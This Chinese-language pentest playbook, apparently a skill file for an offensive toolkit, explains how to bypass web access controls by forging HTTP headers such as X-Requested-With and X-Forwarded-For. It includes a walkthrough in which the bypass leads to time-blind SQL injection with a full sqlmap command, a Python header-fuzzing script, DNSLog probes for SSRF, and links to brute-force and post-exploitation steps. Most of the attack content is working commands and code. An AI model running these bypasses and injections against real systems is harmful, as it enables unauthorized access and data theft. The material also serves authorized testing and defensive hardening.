# HTTP Header 模糊测试 — 访问控制绕过

> 当请求返回 `Permission Denied` / `Access Denied` / `Enter global action code` 等通用拒绝，而非 SQL 注入/XSS 的 WAF 拦截时——可能是应用层访问控制在校验特定 HTTP Header。

## 一、核心方法

```
遇到 "Permission Denied" / "Access Denied" 类响应:

1. 先加 Origin + Referer（最常见）
   Origin: https://target.com
   Referer: https://target.com/

2. 如果仍然拒绝 → 逐个头测试关键 header:
   X-Requested-With: XMLHttpRequest      ← 模拟 AJAX 请求
   X-Forwarded-For: 127.0.0.1            ← 模拟内网请求
   X-Real-IP: 127.0.0.1
   Content-Type 变体切换                  ← application/json vs form-urlencoded

3. 如果还拒绝 → 用 headers.txt 词表系统化 fuzz

原理:
  很多应用/WAF 配置为"信任来自前端的 AJAX 请求"。
  添加 X-Requested-With: XMLHttpRequest 后，服务器端可能:
  - 跳过某些 CSRF 保护
  - 跳过 IP 白名单检查
  - 跳过频率限制
  - 跳过参数校验
  但这个 header 可以任意伪造 → 形同虚设。
```

## 二、实战案例：X-Requested-With 绕过

```
目标: POST /public/bookingAX.php
原始响应: {"stat":true,"msg":"Enter global action code"} 或 "Permission Denied"

尝试 1 — 加 Origin + Referer:
  Origin: https://target.com
  Referer: https://target.com/
  → 仍然 "Permission Denied"

尝试 2 — 加 X-Requested-With:
  X-Requested-With: XMLHttpRequest
  → 绕过成功，正常返回业务数据

后续: 在 code 参数发现 SQL 注入（时间盲注）

sqlmap 命令（带绕过 header）:
  sqlmap -u "https://target.com/public/bookingAX.php" \
    --data="task=unlockcode&lang=de&eventnr=500&orderid=&code=500" \
    --cookie="PHPSESSID=xxx" \
    --headers="X-Requested-With: XMLHttpRequest\nReferer: https://target.com/\nOrigin: https://target.com" \
    -p code --level=3 --risk=3 --technique=T --dbms=mysql \
    --time-sec=8 --batch --random-agent --dbs

关键教训:
  不要只试 Origin/Referer。
  当返回 "Permission Denied" 而非 "SQL injection detected" 时，
  问题不在 SQL payload 本身，而在请求被应用层访问控制拦截了。
  先解决"到达"问题，再测漏洞。
```

## 三、Header Fuzz 优先级

### 第一梯队（最常有效）

| Header | 值 | 用途 |
|--------|-----|------|
| `X-Requested-With` | `XMLHttpRequest` | 模拟 AJAX，绕过"非 AJAX 请求拒绝" |
| `X-Forwarded-For` | `127.0.0.1` | 伪造来源 IP，绕过 IP 白名单 |
| `X-Real-IP` | `127.0.0.1` | 同上，nginx 常用 |
| `Origin` | `https://target.com` | CORS 校验 |
| `Referer` | `https://target.com/` | 来源校验 |
| `Content-Type` | `application/json` / `application/x-www-form-urlencoded` | 切换请求格式 |

### 第二梯队（路径/方法覆盖）

| Header | 值 | 用途 |
|--------|-----|------|
| `X-Original-URL` | `/admin` | 路径覆盖，绕过 URL 访问控制 |
| `X-Rewrite-URL` | `/admin` | 同上 |
| `X-HTTP-Method-Override` | `GET` / `PUT` | HTTP 方法覆盖 |
| `X-Http-Method` | `GET` | 同上 |
| `X-Forwarded-Host` | `target.com` | Host 头覆盖 |
| `X-ORIGINAL-HOST` | `target.com` | 同上 |
| `X-Forwarded-Proto` | `https` | 协议覆盖 |

### 第三梯队（内部/代理头）

| Header | 值 | 用途 |
|--------|-----|------|
| `Client-IP` | `127.0.0.1` | 某些代理传递真实 IP |
| `X-Client-IP` | `127.0.0.1` | 同上 |
| `X-Custom-IP-Authorization` | `127.0.0.1` | 自定义 IP 认证头 |
| `X-Forwarded-Port` | `443` | 端口覆盖 |
| `X-Forwarded-Server` | `target.com` | 服务器标识 |
| `X-HTTPS` | `1` | HTTPS 标记 |

### SSRF 场景专用（header 值设为 DNSLog 地址）

```
测试方法: 将以下 header 的值设为你的 DNSLog/Interactsh 地址，
         如果收到 DNS 回显 → 目标服务器解析了 header 值 → 可能存在 SSRF。

X-Forwarded-For: <YOUR_DNSLOG>
X-Real-IP: <YOUR_DNSLOG>
X-Forwarded-Host: <YOUR_DNSLOG>
X-Original-URL: <YOUR_DNSLOG>
X-Rewrite-URL: <YOUR_DNSLOG>
Referer: <YOUR_DNSLOG>
Origin: <YOUR_DNSLOG>
X-Wap-Profile: <YOUR_DNSLOG>
X-Forwarded-Server: <YOUR_DNSLOG>
X-HTTP-Method-Override: <YOUR_DNSLOG>
```

## 四、完整 Header Fuzz 词表

> 来自 https://github.com/z1sec/Testing/blob/main/headers.txt（330+ 头）

完整词表涵盖以下类别：

```
常规请求头:         Accept, Authorization, User-Agent, Referer, Origin...
CORS 头:            Access-Control-Allow-Origin, Access-Control-Request-Method...
Content 头:         Content-Type, Content-Length, Content-Encoding...
X-Forwarded 系列:   X-Forwarded-For, X-Real-IP, X-Forwarded-Host, X-Forwarded-Proto...
路径/方法覆盖:       X-Original-URL, X-Rewrite-URL, X-HTTP-Method-Override...
内部/代理头:         Client-IP, X-Client-IP, X-Server-Name, X-Server-Port...
AWS 头:             X-Amz-Cf-Id, X-Amzn-Trace-Id, CloudFront-Viewer-Counter...
CDN 头:             X-Cache, X-Cache-Hits, X-Varnish, X-MSEdge-Ref...
Google 头:          X-Goog-IAP-JWT-Assertion, X-Goog-Authenticated-User-Email...
SharePoint 头:      X-SharePointHealthScore, X-Forms_Based_Auth_Required...
新浪安全头:          X-Sina-Safe-* (80+ variants)
```

完整词表路径: `\\<NAS_IP>\share\novecento` 的 `06-工具与命令/字典/headers.txt`
或从 GitHub 下载: https://raw.githubusercontent.com/z1sec/Testing/main/headers.txt

## 五、Fuzz 流程与脚本

```
系统化 Header Fuzz 流程:

1. 准备基线请求（正常返回的请求）
2. 每次添加/修改一个 header
3. 对比响应: 状态码变化 / Content-Length 变化 / Body 中关键词变化
4. 命中后记录该 header，继续测下一个

判定标准:
  - 200 + 正常数据（之前 403/401）→ 绕过成功
  - Body 不再含 "Permission Denied" → 绕过成功  
  - Content-Length 显著变化 → 可能绕过，需人工确认
```

### Python Fuzz 脚本

```python
import requests

url = "https://target.com/api/endpoint"
method = "POST"
data = {"param1": "value1", "param2": "value2"}
cookies = {"PHPSESSID": "xxx"}

# 基线请求（预期被拒绝）
baseline = requests.request(method, url, data=data, cookies=cookies)
baseline_len = len(baseline.text)
print(f"[*] Baseline: {baseline.status_code} len={baseline_len}")

# 关键 header 列表
headers_to_test = [
    {"X-Requested-With": "XMLHttpRequest"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Real-IP": "127.0.0.1"},
    {"Origin": "https://target.com"},
    {"Referer": "https://target.com/"},
    {"X-Original-URL": "/"},
    {"X-Rewrite-URL": "/"},
    {"X-HTTP-Method-Override": "GET"},
    {"Client-IP": "127.0.0.1"},
]

for h in headers_to_test:
    resp = requests.request(method, url, data=data, 
                           cookies=cookies, headers=h)
    delta = len(resp.text) - baseline_len
    flag = " ★" if (resp.status_code == 200 and delta > 50) else ""
    print(f"  {list(h.keys())[0]}: {resp.status_code} len={len(resp.text)} (Δ{delta:+d}){flag}")
```

## 六、与其他 Skill 的协作

| 场景 | 协作路径 |
|------|---------|
| Header 绕过 → 继续 SQL 注入 | `/web-exploit` SQL 注入章节 |
| Header 绕过 → 继续爆破 | `/brute-force` |
| Header 值设为 DNSLog → 检测 SSRF | `/web-exploit` SSRF 章节 |
| X-Forwarded-For 绕过 → 内网 IP 伪造 | `/post-exploit` 横向移动 |
| 完整 header fuzz 字典 | KB `06-工具与命令/字典/headers.txt` |
